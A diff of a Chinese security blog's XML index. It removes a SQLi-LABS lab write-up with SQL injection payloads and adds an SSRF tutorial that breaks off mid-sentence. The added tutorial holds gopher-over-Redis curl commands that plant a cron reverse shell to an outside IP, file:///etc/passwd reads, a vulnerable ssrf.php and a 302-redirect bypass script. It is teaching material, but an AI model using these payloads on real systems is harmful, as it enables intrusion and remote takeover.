@@ -547,99 +547,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQLi-LABS (Challenges) 54-65关</title>
-    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
-    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
-<ul>
-<li><strong>判断闭合方式和参数数据类型</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
-<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
-<ul>
-<li><strong>判断字段数</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
-<p>得出查询返回的字段数有3个</p>
-<ul>
-<li><strong>查询有可注入的字段</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
-<p>可见字段2，3是可以显示出来的。</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
-<p>可知表名为 ttyxbfpvca</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
-<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
-<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
-<ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
-<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
-<p>得知表名为：7dvdblb1tl</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
-<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
-<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
-<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQLmap 常用命令</title>
     <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
@@ -728,6 +635,233 @@
 ]]></content>
       <categories>
         <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF总结</title>
+    <url>/2021/03/31/SSRF%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="SSRF总结"><a href="#SSRF总结" class="headerlink" title="SSRF总结"></a>SSRF总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以<strong>服务器的身份</strong>发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的<strong>内部系统</strong>。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20.png" alt="img"></p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>对目标服务器所在内网进行IP存活性扫描和端口扫描</li>
+<li>利用扫描的自问信息判断开放的服务，从而对内网的主机进行攻击</li>
+<li>识别内网web应用指纹，判断应用类型进行攻击</li>
+<li>使用特定协议攻击应用（gopher、dict、file、FTP/SFTP等）</li>
+</ul>
+<h2 id="容易出现漏洞的地方"><a href="#容易出现漏洞的地方" class="headerlink" title="容易出现漏洞的地方"></a>容易出现漏洞的地方</h2><h3 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h3><p>通过url 地址分享文章，例如如下地址：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;share.xxx.com&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
+<h3 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h3><p>通过URL地址加载或下载图片</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;image.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
+<h3 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;title.xxx.com&#x2F;title?title&#x3D;http:&#x2F;&#x2F;title.xxx.com&#x2F;as52ps63de</span><br></pre></td></tr></table></figure>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<h3 id="利用参数中的关键字来查找"><a href="#利用参数中的关键字来查找" class="headerlink" title="利用参数中的关键字来查找"></a>利用参数中的关键字来查找</h3><ul>
+<li><p>share</p>
+</li>
+<li><p>wap</p>
+</li>
+<li><p>url</p>
+</li>
+<li><p>link</p>
+</li>
+<li><p>src</p>
+</li>
+<li><p>source</p>
+</li>
+<li><p>target</p>
+</li>
+<li><p>u</p>
+</li>
+<li><p>3g</p>
+</li>
+<li><p>display</p>
+</li>
+<li><p>sourceURl</p>
+</li>
+<li><p>imageURL</p>
+</li>
+<li><p>domain</p>
+</li>
+</ul>
+<h2 id="产生漏洞的函数"><a href="#产生漏洞的函数" class="headerlink" title="产生漏洞的函数"></a>产生漏洞的函数</h2><p>下面是几个可能会存在SSRF的服务器使用的函数：</p>
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>这个函数的作用是将整个文件读入一个字符串。</p>
+<p>example:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$homepage</span> = file_get_contents(<span class="string">&#x27;./people.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$homepage</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>获取<code>./people.txt</code>文件的内容，并以字符串的形式显示出来。</p>
+<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p>这个函数的作用是打开一个网络连接或者一个Unix套接字连接。</p>
+<p>example：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="string">&quot;www.example.com&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: www.example.com\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p>这个函数的作用是执行给定的 cURL 会话。</p>
+<p>example:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.example.com/&quot;</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="常用协议介绍"><a href="#常用协议介绍" class="headerlink" title="常用协议介绍"></a>常用协议介绍</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>file协议主要用于访问本地计算机的文件，就如同windows资源管理器中打开文件一样，可以用于读取文件进行查看。</p>
+<p>example:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>词典网络协议可以用于探测或扫描内网端口在SSRF中发挥重要作用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher是internet上一个非常有名的信息查找系统，你可以这么理解成可以和TCP进行一个发送数据包，因为我们SSRF漏洞语出web页面，所以我们可以有效地利用gopher协议进行加以利用其它程序漏洞来进行进一步的提权。</p>
+<p>gopher协议的转换规则如下：</p>
+<ul>
+<li>如果第一个字符是<code>&gt;</code>或者<code>&lt; </code>那么丢弃该行字符串，表示请求和返回的时间。</li>
+<li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li>
+<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
+<li>空白行替换为<code>%0a</code></li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
+<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict protocol - 探测Redis</span></span><br><span class="line">curl -v <span class="string">&#x27;dict://127.0.0.1:6379/info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol - 任意文件读取</span></span><br><span class="line">curl -v <span class="string">&#x27;file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol - 一键反弹Bash</span></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line">curl -v <span class="string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用file协议任意文件读取</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用dict协议查看端口</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用gopher协议反弹shell</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="漏洞代码ssrf2-php"><a href="#漏洞代码ssrf2-php" class="headerlink" title="漏洞代码ssrf2.php"></a>漏洞代码ssrf2.php</h4><ul>
+<li>限制协议为HTTP、HTTPS</li>
+<li>设置跳转重定向为True（默认不跳转）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="远程利用方式-1"><a href="#远程利用方式-1" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
+<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
+<p>我们继续构造一个302跳转服务，代码如下302.php:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict protocol - 探测Redis</span></span><br><span class="line">dict://127.0.0.1:6379/info  </span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol - 任意文件读取</span></span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol - 一键反弹Bash</span></span><br><span class="line"><span class="comment"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span></span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d</span></span><br><span class="line"><span class="string">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="更改IP地址写法"><a href="#更改IP地址写法" class="headerlink" title="更改IP地址写法"></a>更改IP地址写法</h3><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</span><br><span class="line">^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br><span class="line">^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br></pre></td></tr></table></figure>
+<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
